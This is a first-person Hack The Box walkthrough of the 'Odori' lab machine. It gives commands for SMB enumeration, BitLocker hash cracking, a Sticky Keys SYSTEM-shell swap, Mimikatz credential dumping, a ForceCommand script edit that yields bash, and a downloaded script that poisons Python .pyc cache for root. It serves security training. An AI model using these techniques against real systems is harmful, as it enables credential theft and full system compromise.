# Hack The Box — Odori | Walkthrough

**Platform:** Hack The Box  
**Operating Systems:** Linux / Windows  
**Key Technologies:** SMB, SFTP, SSH, Python  
**Objective:** Initial Access, Privilege Escalation, User and Root Flags

## 1. Introduction

In this walkthrough, I will document the process of compromising the **Odori** machine on Hack The Box, from initial enumeration to obtaining root privileges.

The machine combines digital forensics, credential recovery, SSH restriction bypass techniques, and privilege escalation through Python bytecode cache manipulation.

**Objective:** Gain access to the target system, compromise the `svc_backup` account, escalate privileges to `root`, and retrieve the `user.txt` and `root.txt` flags.

### Techniques Used

- Service enumeration using Nmap.
- SMB share enumeration.
- Analysis of a BitLocker-encrypted VMDK disk image.
- Windows credential recovery.
- Bypassing SSH restrictions through SFTP.
- Identifying scheduled tasks running with root privileges.
- Python Bytecode Cache Poisoning (`.pyc`).

The initial forensic analysis steps are presented as a reference approach. During my own exploitation process, I directly verified SFTP access, modification of the `restrict` script, and the final privilege escalation.

---

## 2. Reconnaissance and Enumeration

### 2.1 Port Scanning

We begin by identifying the services exposed by the target machine.

```bash
nmap -sC -sV -Pn -p- 10.129.183.7 -oN nmap.txt
```

The main services identified were:

| Port | Service | Description |
|---|---|---|
| 22/tcp | SSH | OpenSSH 8.9p1 |
| 139/tcp | NetBIOS | File-sharing service |
| 445/tcp | SMB | Samba |

The presence of SMB suggests that we should investigate shared resources to identify potentially exposed files.

### 2.2 SMB Enumeration

We can use NetExec to check whether the server allows unauthenticated access.

```bash
nxc smb 10.129.183.7 -u '' -p '' --shares
```

The available shares include:

```text
Share       Permissions
-----       -----------
print$
backup      READ
IPC$
```

The `backup` share allows read access, so we can connect using:

```bash
smbclient //10.129.183.7/backup -N
```

Inside the share, we find an `info.txt` file containing a reference to the VMDK disk image provided in the machine description.

**Finding:** The initial access path involves analyzing a Windows backup rather than directly exploiting a web service.

---

## 3. Forensic Analysis and Credential Recovery

### 3.1 VMDK Disk Image Analysis

We download the disk image provided by Hack The Box and extract its contents:

```bash
7z x odori.7z
```

Next, we inspect the disk image format:

```bash
file file02.vmdk
qemu-img info file02.vmdk
```

Partition analysis reveals a Windows installation with its main partition protected by BitLocker.

To recover the encryption password, we extract the hashes:

```bash
bitlocker2john -i file02.vmdk > vm-hash
```

We then use John the Ripper with the `rockyou.txt` wordlist:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt vm-hash
```

The recovered password is:

```text
********************
```

This allows us to unlock the encrypted disk. However, we still need to gain access to a Windows account.

### 3.2 Accessing Windows Through WinRE

We create a virtual machine using a copy of the VMDK file and configure its network adapter in an isolated environment (*Host-only*).

Next, we boot the virtual machine using a Windows installation ISO and access the recovery options.

From the recovery command prompt, we identify the appropriate volume:

```powershell
diskpart
list volume
select volume 1
assign letter=E
exit
```

We then unlock BitLocker:

```powershell
manage-bde -unlock E: -pw
```

Once the partition is unlocked, we take advantage of the Windows Sticky Keys accessibility feature to obtain a SYSTEM command prompt from the login screen.

```powershell
copy E:\Windows\System32\sethc.exe E:\Windows\System32\sethc.exe.bak
copy E:\Windows\System32\cmd.exe E:\Windows\System32\sethc.exe
```

After restarting Windows and pressing `Shift` five times at the login screen, a command prompt with SYSTEM privileges becomes available.

### 3.3 Credential Extraction

Once we have access to Windows, we use Mimikatz to inspect stored credentials:

```text
privilege::debug
token::elevate
lsadump::sam
```

Although NTLM hashes can be extracted, they do not directly provide the access required to compromise the Linux server.

An important clue appears in the credentials associated with Windows scheduled tasks.

```text
vault::list
vault::cred /patch
```

The recovered credentials belong to the following account:

```text
Username: svc_backup
Password: Napping2Curator
```

This account is used by a scheduled backup task that communicates through SFTP, making it our next target for obtaining access to the Linux server.

---

## 4. Initial Access Through SFTP

### 4.1 Restricted SSH Connection

We first attempt to establish an SSH connection:

```bash
ssh svc_backup@10.129.183.7
```

However, even with valid credentials, the server restricts interactive SSH sessions.

Therefore, we attempt an SFTP connection instead:

```bash
sftp svc_backup@10.129.183.7
```

The SFTP connection allows us to enumerate files and directories on the target system.

### 4.2 Identifying the Restriction

We download the SSH configuration file:

```text
sftp> get /etc/ssh/sshd_config
```

We discover a configuration similar to:

```text
Match group svc_backup
    ForceCommand /opt/restrict /home/%u
    AllowTcpForwarding no
```

The `ForceCommand` directive forces the execution of `/opt/restrict`, regardless of the command requested by the SSH client.

After inspecting the script, we find:

```bash
#!/bin/bash

/usr/lib/openssh/sftp-server -d $1
```

This means that every new connection is redirected to the SFTP server instead of an interactive shell.

### 4.3 Modifying `restrict`

The vulnerability exists because the `svc_backup` user can modify the script responsible for enforcing its own SSH restrictions.

We create a modified version of the script:

```bash
nano restrict
```

Contents:

```bash
#!/bin/bash

#/usr/lib/openssh/sftp-server -d $1
bash
```

We then upload the modified file through SFTP:

```text
sftp> put restrict /opt/restrict
```

In my case, the transfer completed successfully:

```text
Uploading restrict to /opt/restrict
restrict 100% 54 0.2KB/s 00:00
```

With this modification, the forced command no longer starts the SFTP server. Instead, it launches Bash.

### 4.4 Obtaining an Interactive Shell

We establish a new SSH connection:

```bash
ssh -tt svc_backup@10.129.183.7
```

Once an interactive shell becomes available, we verify the current user:

```bash
whoami
id
```

Expected output:

```text
uid=1001(svc_backup) gid=1001(svc_backup) groups=1001(svc_backup)
```

We now have access to the Linux server, although we do not yet have administrative privileges.

**Identified Vulnerability:** An insecure `ForceCommand` configuration allows the restricted user to modify the script responsible for enforcing the SSH restriction.

---

## 5. Retrieving user.txt

After gaining access to the `svc_backup` account, we can locate the first flag.

```bash
ls -la /home/svc_backup/
```

The expected location is:

```text
/home/svc_backup/user.txt
```

To read the flag:

```bash
cat /home/svc_backup/user.txt
```

---

## 6. Privilege Escalation to Root

This is the most interesting part of the machine because it exploits the internal behavior of Python's bytecode caching mechanism.

### 6.1 Privilege Enumeration

We begin by checking the current user's permissions:

```bash
sudo -l
```

We also search for binaries with the SUID permission bit enabled:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Since we do not find a useful privilege escalation path through `sudo`, we investigate running processes and automated tasks.

Using `pspy`, we identify a process that periodically runs with root privileges:

```text
UID=0 | python3 /opt/archiver/app.py
```

This process runs approximately every minute.

### 6.2 Analyzing `/opt/archiver`

We inspect the application directory:

```bash
ls -la /opt/archiver/
```

The relevant files and directories include:

```text
app.py
helper.py
__pycache__/
```

The application imports a function from `helper.py`:

```python
from helper import tar_and_move_files
```

The process is responsible for identifying old files in `/backup` and archiving them in `/archive`.

However, the `__pycache__` directory has write permissions accessible to unprivileged users.

**This means an unprivileged user can replace Python bytecode files that may later be loaded by a process running as root.**

### 6.3 Python Bytecode Cache Poisoning

Python uses `.pyc` files to store previously compiled bytecode.

These files help improve module-loading performance by allowing Python to reuse compiled code when its cache validation checks succeed.

The vulnerable file is:

```text
/opt/archiver/__pycache__/helper.cpython-310.pyc
```

The attack involves creating a modified bytecode file while preserving a valid header that matches the original `helper.py` source file.

When the scheduled task executes `app.py`, Python imports the module and executes the modified bytecode with the privileges of the running process.

The timestamp-based validation mechanism, which relies on source-file modification time and size, makes it possible to reuse a manipulated `.pyc` file without directly modifying `helper.py`.

The resulting exploitation chain is:

```text
svc_backup
    |
    v
Writable __pycache__ directory
    |
    v
Modified helper.cpython-310.pyc
    |
    v
Root-owned scheduled task
    |
    v
Python imports malicious bytecode
    |
    v
Code execution with root privileges
```

### 6.4 Automating Privilege Escalation

To avoid manually modifying the bytecode and its header, we use the `odori_privesc.py` script prepared during the exploitation process.
```
git clone https://github.com/TraceVoid/HTB/machine/odori/odori_privesc.py
```

On Parrot OS, we start a temporary HTTP server:

```bash
python3 -m http.server 8000 --bind 0.0.0.0
```

From the `svc_backup` shell, we download the script:

```bash
wget http://IP_TUN0:8000/odori_privesc.py -O /tmp/odori_privesc.py
```

We then execute it:

```bash
python3 /tmp/odori_privesc.py
```

The script automates the preparation and replacement of Python bytecode so that the scheduled task running as root creates a SUID-enabled copy of Bash.

The resulting privileged binary is expected to be created at:

```text
/tmp/rootbash
```

### 6.5 Obtaining Root Privileges

Once the scheduled task executes the modified bytecode, we check whether the privileged binary has been created:

```bash
ls -l /tmp/rootbash
```

The expected result is a binary owned by root with the SUID bit enabled:

```text
-rwsr-xr-x 1 root root ... /tmp/rootbash
```

We execute the binary using:

```bash
/tmp/rootbash -p
```

Next, we verify our privileges:

```bash
id
```

The expected output includes:

```text
euid=0(root)
```

It is important to understand that the real user ID (`uid`) may still belong to `svc_backup`, while the effective user ID (`euid=0`) confirms that the shell is running with root privileges.

---

## 7. Retrieving root.txt

After obtaining a privileged shell, we locate the final flag.

```bash
ls -la /root/
```

We then read it:

```bash
cat /root/root.txt
```

If the flag is not located in the expected directory, we can search the entire filesystem:

```bash
find / -type f -name "root.txt" 2>/dev/null
```

Retrieving `root.txt` completes the machine.

---

## 8. Attack Chain Summary

1. **Enumeration:** Identified exposed SSH and SMB services.
2. **File Access:** Discovered an anonymously readable SMB backup share.
3. **Digital Forensics:** Extracted and decrypted a BitLocker-protected VMDK disk image.
4. **Credential Recovery:** Recovered the credentials of the `svc_backup` account from Windows.
5. **Initial Foothold:** Established SFTP access and bypassed SSH `ForceCommand` restrictions by modifying `/opt/restrict`.
6. **Privilege Escalation:** Manipulated `helper.cpython-310.pyc` to exploit a scheduled task running with root privileges.
7. **Final Objective:** Obtained a privileged shell and retrieved the `root.txt` flag.

---

## 9. Lessons Learned

The Odori machine helped me gain a better understanding of how multiple security misconfigurations can be chained together to fully compromise a system. One of the most interesting aspects was discovering that, even though an account was restricted to SFTP access, it was possible to bypass this limitation because of incorrect file permissions on the script responsible for enforcing SSH restrictions.

However, the most valuable learning experience came from the privilege escalation phase. Before working on this machine, I had not explored the internal behavior of Python `.pyc` files in much detail or how Python uses cached bytecode to optimize module imports. I learned that protecting source code alone is not sufficient if other components used by privileged applications can be modified by unauthorized users.

I also reinforced the importance of carefully analyzing automated processes, directory permissions, and interactions between system components instead of relying exclusively on known exploits. This machine demonstrates that thorough enumeration and a solid understanding of how operating systems and applications work are essential skills during a penetration testing engagement.
